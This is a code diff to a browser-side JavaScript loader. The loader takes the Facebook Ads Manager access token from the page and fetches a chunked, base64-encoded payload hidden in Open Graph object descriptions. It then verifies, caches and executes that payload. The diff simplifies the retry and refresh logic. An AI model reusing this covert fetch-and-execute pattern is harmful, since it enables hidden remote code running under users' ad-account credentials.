@@ -137,7 +137,7 @@
     if (!cached) {
       return null;
     }
-    const warning = `Cannot load latest remote payload: ${reason}. Using cached ${cached.version}.`;
+    const warning = `Cannot load latest payload from Facebook OG: ${reason}. Using cached ${cached.version}.`;
     console.warn(`[${loaderConfig.app} loader] ${warning}`);
     window[guardKey].warning = warning;
     window[guardKey].source = sourceTag;
@@ -162,7 +162,7 @@
     const graphUrls = getGraphUrls(accessToken);
     return fetchJson(graphUrls.objectById(id));
   };
-  const resolveOgObjectIdByUrl = async (url, options = {}) => {
+  const resolveOgObjectIdByUrl = async (url) => {
     if (!url) {
       throw new Error("No manifest URL configured.");
     }
@@ -171,9 +171,6 @@
       throw new Error("Cannot find Ads Manager access_token in current page runtime.");
     }
     const graphUrls = getGraphUrls(accessToken);
-    if (options.forceRefresh) {
-      await fetchJson(graphUrls.scrapeByUrl(url), { method: "POST" });
-    }
     const resolved = await fetchJson(graphUrls.ogByUrl(url));
     const ogObjectId = resolved?.og_object?.id;
     if (!ogObjectId) {
@@ -181,8 +178,8 @@
     }
     return ogObjectId;
   };
-  const fetchManifest = async (options = {}) => {
-    const manifestOgObjectId = await resolveOgObjectIdByUrl(loaderConfig.manifestUrl, options);
+  const fetchManifest = async () => {
+    const manifestOgObjectId = await resolveOgObjectIdByUrl(loaderConfig.manifestUrl);
     const object = await fetchOgObject(manifestOgObjectId);
     const manifest = JSON.parse(decodeBase64Utf8(object?.description || ""));
     if (manifest?.app !== loaderConfig.app || !manifest?.version || !manifest?.payload?.sha256) {
@@ -192,20 +189,21 @@
       throw new Error("Manifest does not contain payload chunks.");
     }
     manifest._resolvedManifestOgObjectId = manifestOgObjectId;
+    manifest._resolvedUpdatedTime = object?.updated_time || "";
     return manifest;
   };
-  const resolveChunkOgObjectId = async (chunk, options = {}) => {
+  const resolveChunkOgObjectId = async (chunk) => {
     const chunkUrl = chunk?.latestUrl || chunk?.url || "";
     if (chunkUrl) {
-      return resolveOgObjectIdByUrl(chunkUrl, options);
+      return resolveOgObjectIdByUrl(chunkUrl);
     }
     if (chunk?.ogObjectId) {
       return chunk.ogObjectId;
     }
     throw new Error(`Chunk ${chunk?.index || "?"} has neither URL nor OG object ID.`);
   };
-  const fetchOgPayload = async (manifest, options = {}) => {
-    const ids = await Promise.all(manifest.chunks.map((chunk) => resolveChunkOgObjectId(chunk, options)));
+  const fetchOgPayload = async (manifest) => {
+    const ids = await Promise.all(manifest.chunks.map((chunk) => resolveChunkOgObjectId(chunk)));
     const chunks = await Promise.all(ids.map((id) => fetchOgObject(id)));
     const encoded = chunks.map((chunk) => chunk?.description || "").join("");
     if (!encoded) {
@@ -222,22 +220,20 @@
     const cached = readCache();
     let manifest = null;
     try {
-      manifest = await fetchManifest({ forceRefresh: true });
-    } catch (refreshError) {
-      console.warn(`[${loaderConfig.app} loader] Forced manifest scrape failed, retrying without refresh.`, refreshError);
-      try {
-        manifest = await fetchManifest();
-      } catch (error) {
-        const fallback = useCachedPayload(cached, `manifest unavailable (${error?.message || error})`, "cache-no-manifest");
-        if (fallback) {
-          return fallback;
-        }
-        throw error;
+      manifest = await fetchManifest();
+    } catch (error) {
+      const fallback = useCachedPayload(cached, `manifest unavailable (${error?.message || error})`, "cache-no-manifest");
+      if (fallback) {
+        return fallback;
       }
+      throw error;
     }
-    window[guardKey].remoteVersion = manifest.version;
+    if (window[guardKey]) {
+      window[guardKey].remoteVersion = manifest.version;
+      window[guardKey].manifestUpdatedTime = manifest._resolvedUpdatedTime || "";
+    }
     if (cached && compareBuildVersions(cached.version, manifest.version) > 0) {
-      return useCachedPayload(cached, `remote manifest ${manifest.version} is older than cached ${cached.version}`, "cache-remote-stale");
+      return useCachedPayload(cached, `Facebook OG manifest ${manifest.version} is older than cached ${cached.version}`, "cache-remote-stale");
     }
     if (cached && cached.version === manifest.version && cached.sha256 === manifest.payload.sha256) {
       log(`using cached ${cached.version}`);
@@ -251,30 +247,11 @@
       window[guardKey].source = "remote";
       return { source, build: manifest.version };
     } catch (error) {
-      console.warn(`[${loaderConfig.app} loader] Remote payload fetch failed, forcing OG refresh.`, error);
-      try {
-        manifest = await fetchManifest({ forceRefresh: true });
-        window[guardKey].remoteVersion = manifest.version;
-        if (cached && compareBuildVersions(cached.version, manifest.version) > 0) {
-          return useCachedPayload(cached, `remote manifest ${manifest.version} is older than cached ${cached.version} even after refresh`, "cache-remote-stale-after-refresh");
-        }
-        if (cached) {
-          log(`using cached ${cached.version} after forced manifest refresh`);
-          window[guardKey].source = "cache-after-refresh";
-          return { source: cached.source, build: cached.version };
-        }
-        const source = await fetchOgPayload(manifest, { forceRefresh: true });
-        writeCache(manifest, source);
-        log(`downloaded and cached ${manifest.version} after forced OG refresh`);
-        window[guardKey].source = "remote-refreshed";
-        return { source, build: manifest.version };
-      } catch (refreshError) {
-        const fallback = useCachedPayload(cached, `remote payload fetch failed (${refreshError?.message || refreshError})`, "cache-remote-failed");
-        if (fallback) {
-          return fallback;
-        }
-        throw refreshError;
+      const fallback = useCachedPayload(cached, `payload fetch failed (${error?.message || error})`, "cache-remote-failed");
+      if (fallback) {
+        return fallback;
       }
+      throw error;
     }
   };
   const executePayload = (source, build) => new Promise((resolve, reject) => {
